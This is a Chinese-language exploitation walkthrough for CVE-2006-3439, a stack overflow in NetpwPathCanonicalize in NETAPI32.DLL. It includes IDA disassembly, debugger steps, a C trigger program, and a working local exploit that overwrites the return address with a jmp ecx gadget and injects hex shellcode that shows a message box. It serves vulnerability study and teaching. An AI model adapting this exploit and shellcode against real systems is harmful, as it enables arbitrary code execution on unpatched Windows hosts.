本次漏洞分析实例是编号CVE-2006-3439，他是系统库NETAPI32.DLL中NetpwPathCanonicalize函数中出现的一个栈溢出漏洞，此函数主要对俩个字符串进行拼接，漏洞主要成因是函数内部对参数进行边界检查是使用了wcslen，而开辟栈的时候是按照ASCLL开辟，也就是我们可以传入双倍字节的参数，造成溢出，下面对此dll中漏洞函数进行分析：第一步，把dll拖入x86IDA中，等加载完成，在函数窗口搜索函数NetpwPathCanonicalize：

![](https://image.3001.net/images/20220825/1661427109_63075da5435586e97c9e6.png!small)

第二步，找到具体触发漏洞函数（逐步跟进，看哪里触发异常）：

![](https://image.3001.net/images/20220825/1661427110_63075da60d47a904d97e6.png!small)

第三步，进入这个call：

![](https://image.3001.net/images/20220825/1661427110_63075da6d4112e60ccb01.png!small)

第四步，分析函数，我们假定传入俩个字符串参数分别为（path，prefix)：

; int __stdcall sub_7517FC68(wchar_t *Str, wchar_t *Source, wchar_t *, int,
int)  
.text:7517FC68 sub_7517FC68 proc near ; CODE XREF: NetpwPathCanonicalize+74↑p  
.text:7517FC68  
.text:7517FC68 var_416 = word ptr -416h  
.text:7517FC68 Dest = word ptr -414h  
.text:7517FC68 Str = dword ptr 8  
.text:7517FC68 Source = dword ptr 0Ch  
.text:7517FC68 arg_8 = dword ptr 10h  
.text:7517FC68 arg_C = dword ptr 14h  
.text:7517FC68 arg_10 = dword ptr 18h  
.text:7517FC68  
.text:7517FC68 push ebp  
.text:7517FC69 mov ebp, esp  
.text:7517FC6B sub esp, 414h ; 开辟栈，0x414  
.text:7517FC71 push ebx  
.text:7517FC72 push esi  
.text:7517FC73 xor esi, esi  
.text:7517FC75 push edi  
.text:7517FC76 cmp [ebp+Str], esi  
.text:7517FC79 mov edi, ds:__imp_wcslen  
.text:7517FC7F mov ebx, 411h ; 边界检查  
.text:7517FC84 jz short loc_7517FCED  
.text:7517FC86 push [ebp+Str] ; prefix字符串  
.text:7517FC89 call edi ; __imp_wcslen  
.text:7517FC8B mov esi, eax ; prefix字符串的长度（unicode）  
.text:7517FC8D pop ecx  
.text:7517FC8E test esi, esi  
.text:7517FC90 jz short loc_7517FCF4  
.text:7517FC92 cmp esi, ebx  
.text:7517FC94 ja loc_7517FD3E  
.text:7517FC9A push [ebp+Str] ; Source  
.text:7517FC9D lea eax, [ebp+Dest]  
.text:7517FCA3 push eax ; Dest  
.text:7517FCA4 call ds:__imp_wcscpy  
.text:7517FCAA mov ax, [ebp+esi*2+var_416]  
.text:7517FCB2 pop ecx  
.text:7517FCB3 cmp ax, 5Ch  
.text:7517FCB7 pop ecx  
.text:7517FCB8 jz short loc_7517FCD5  
.text:7517FCBA cmp ax, 2Fh  
.text:7517FCBE jz short loc_7517FCD5  
.text:7517FCC0 lea eax, [ebp+Dest]  
.text:7517FCC6 push offset asc_751717B8 ; "\\\"  
.text:7517FCCB push eax ; Dest  
.text:7517FCCC call ds:__imp_wcscat  
.text:7517FCD2 pop ecx  
.text:7517FCD3 inc esi  
.text:7517FCD4 pop ecx  
.text:7517FCD5  
.text:7517FCD5 loc_7517FCD5: ; CODE XREF: sub_7517FC68+50↑j  
.text:7517FCD5 ; sub_7517FC68+56↑j  
.text:7517FCD5 mov eax, [ebp+Source]  
.text:7517FCD8 mov ax, [eax]  
.text:7517FCDB cmp ax, 5Ch  
.text:7517FCDF jz short loc_7517FCE7  
.text:7517FCE1 cmp ax, 2Fh  
.text:7517FCE5 jnz short loc_7517FCF4  
.text:7517FCE7  
.text:7517FCE7 loc_7517FCE7: ; CODE XREF: sub_7517FC68+77↑j  
.text:7517FCE7 add [ebp+Source], 2  
.text:7517FCEB jmp short loc_7517FCF4  
.text:7517FCED ;
---------------------------------------------------------------------------  
.text:7517FCED  
.text:7517FCED loc_7517FCED: ; CODE XREF: sub_7517FC68+1C↑j  
.text:7517FCED mov [ebp+Dest], si  
.text:7517FCF4  
.text:7517FCF4 loc_7517FCF4: ; CODE XREF: sub_7517FC68+28↑j  
.text:7517FCF4 ; sub_7517FC68+7D↑j ...  
.text:7517FCF4 push [ebp+Source] ; path字符串  
.text:7517FCF7 call edi ; __imp_wcslen  
.text:7517FCF9 add eax, esi ; path+\\+prefix的长度  
.text:7517FCFB pop ecx  
.text:7517FCFC cmp eax, ebx ;
第二次边界检查，ebx=0x411，俩次拼接但是这里指的是UNICODE的长度，也就是说我们在这里可以传入0x822字节东西  
.text:7517FCFE ja short loc_7517FD3E  
.text:7517FD00 push [ebp+Source] ; Source  
.text:7517FD03 lea eax, [ebp+Dest]  
.text:7517FD09 push eax ; Dest  
.text:7517FD0A call ds:__imp_wcscat  
.text:7517FD10 pop ecx  
.text:7517FD11 lea eax, [ebp+Dest]  
.text:7517FD17 pop ecx  
.text:7517FD18 push eax  
.text:7517FD19 call sub_7518AE95  
.text:7517FD1E lea eax, [ebp+Dest]  
.text:7517FD24 push eax ; Name  
.text:7517FD25 call sub_7518AEB3  
.text:7517FD2A test eax, eax  
.text:7517FD2C jnz short loc_7517FD43  
.text:7517FD2E lea eax, [ebp+Dest]

第五步，我们得到结论可以传入0x822字节，但是栈中buffer只要0x411字节，意味着无论是path参数还是prefix参数，我们都可以传入双倍内容，随后发现在漏洞函数之前，有一个函数已经对prefix参数进行了长度检查，所以我们只能利用path参数：![](https://image.3001.net/images/20220825/1661427111_63075da79653963636f2c.png!small)

# 二、环境配置

环境

|

配置  
  
---|---  
  
系统

|

WinXP  
  
编译器

|

VC6++  
  
调试器

|

x86IDA，x86DBG  
  
项目配置

|

win32+realse  
  
文件

|

netapi32.dll  
  
dll文件

# 三、漏洞分析

测试代码如下：我直接加载没打补丁的dll，我们主要是通过loadlibrary函数加载我们的dll，然后通过GetProcAddress函数获得NetpwPathCanonicalize函数地址，通过函数指针调用，传入俩个参数，一个全部覆盖为61，一个全部覆盖为62，结尾都是以00结尾，观察是哪里造成溢出：

#include  
typedef void (*MYPROC)(LPTSTR);  
int main()  
{  
char path[0x320];  
char can_path[0x440];  
int maxbuf=0x440;  
char prefix[0x100];  
long pathtype=44;  
//load vulnerability netapi32.dll which we got from a WIN2K sp4 host  
HINSTANCE LibHandle;  
MYPROC Trigger;  
char dll[ ] = "./netapi32.dll"; // care for the path  
char VulFunc[ ] = "NetpwPathCanonicalize";  
LibHandle = LoadLibrary(dll);  
Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);  
memset(path,0,sizeof(path));  
memset(path,'a',sizeof(path)-2);  
memset(prefix,0,sizeof(prefix));  
memset(prefix,'b',sizeof(prefix)-2);  
(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);  
FreeLibrary(LibHandle);  
}

生成realse，拖入x86dbg，F9进入程序领空：

![](https://image.3001.net/images/20220825/1661427112_63075da873106f704cfc5.png!small)

找到主函数入口：

![](https://image.3001.net/images/20220825/1661427113_63075da9310fcf5b1a0a7.png!small)

进入主函数，找到我们函数指针调用的NetpwPathCanonicalize函数处：

![](https://image.3001.net/images/20220825/1661427113_63075da9e33b5cf86c1db.png!small)

运行到call edx处，查看edx的值，跳转到NetpwPathCanonicalize头部下断点：

![](https://image.3001.net/images/20220825/1661427114_63075daaaef9c8326cc2d.png!small)

运行到漏洞函数，再找到具体拷贝字符串函数，下断点：![](https://image.3001.net/images/20220825/1661427115_63075dab721b2979b0fac.png!small)

进入目标函数：![](https://image.3001.net/images/20220825/1661427116_63075dac3a22c3512601f.png!small)

F4运行到第二个wcscat函数后：

![](https://image.3001.net/images/20220825/1661427117_63075dad002c2cd3c7b3d.png!small)

观察堆栈：  
esp处：

![](https://image.3001.net/images/20220825/1661427117_63075dadda314650a9275.png!small)

发现我们栈中buffer首地址是12F294；  
ebp处：

![](https://image.3001.net/images/20220825/1661427118_63075dae5d0f82cc42d8f.png!small)

我们发现path字符串倒数第4-第8字节淹没返回值；运行到函数尾部：![](https://image.3001.net/images/20220825/1661427118_63075daeea2ab6fcfb4e3.png!small)

我们发现ecx的值正好指向我们buffer首地址，所以我们只需要在淹没返回值那里找到一个jmp ecx或者call
ecx的指令，在netapi32.dll中我找到一条指令751852F9：

![](https://image.3001.net/images/20220825/1661427119_63075dafb0d44d22b5623.png!small)

把此地址构造在淹没返回值的地方，程序流程就可以跳转到我们buffer中去，接下来构造shellcode，下面是新代码，我们吧path参数倒数4-8位置写成我们的跳转指令，即751852F9，再给prefix拷贝我们弹窗shellcode，作用是弹一个MessageBox的框，供我们观察：

#include  
typedef void (*MYPROC)(LPTSTR);  
char shellcode2[]=  
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"  
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"  
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"  
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"  
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"  
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"  
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"  
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"  
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"  
"\x53\x68\x6F\x70\x20\x20\x68\x76\x75\x6C\x74\x8B\xC4\x53\x50\x50"  
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90";  
int main()  
{  
char path[0x320];  
char can_path[0x440];  
int maxbuf=0x440;  
char prefix[0x100];  
long pathtype=44;  
//load vulnerability netapi32.dll which we got from a WIN2K sp4 host  
HINSTANCE LibHandle;  
MYPROC Trigger;  
char dll[ ] = "./netapi32.dll"; // care for the path  
char VulFunc[ ] = "NetpwPathCanonicalize";  
LibHandle = LoadLibrary(dll);  
Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);  
memset(path,0,sizeof(path));  
memset(path,0x90,sizeof(path)-2);  
memset(prefix,0,sizeof(prefix));  
memset(prefix,0x90,sizeof(prefix)-2);  
memcpy(prefix,shellcode2,176);  
//0x751852F9  
path[0x318] = 0xF9;  
path[0x319] = 0x52;  
path[0x31A] = 0x18;  
path[0x31B] = 0x75;  
//__asm int 3  
(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);  
FreeLibrary(LibHandle);  
}

观察运行结果，弹窗成功：

![](https://image.3001.net/images/20220825/1661427120_63075db06a344e06734e9.png!small)

接下来我们继续吧程序拖入x86dbg中，按照前面流程到触发漏洞函数处：

![](https://image.3001.net/images/20220825/1661427121_63075db108bfe0d5d1a73.png!small)

F7进入，并运行到函数尾部：![](https://image.3001.net/images/20220825/1661427122_63075db215789b0fbcab6.png!small)

观察堆栈情况：栈内buffer：![](https://image.3001.net/images/20220825/1661427122_63075db2d304da3b0cea7.png!small)

返回值处：![](https://image.3001.net/images/20220825/1661427123_63075db37ba92ccc8d68d.png!small)

一切如我们所料，继续运行，到了我们的shellcode处：![](https://image.3001.net/images/20220825/1661427124_63075db412578e21fee37.png!small)

F9运行，弹框![](https://image.3001.net/images/20220825/1661427124_63075db4d1b0da4cf3ddf.png!small)

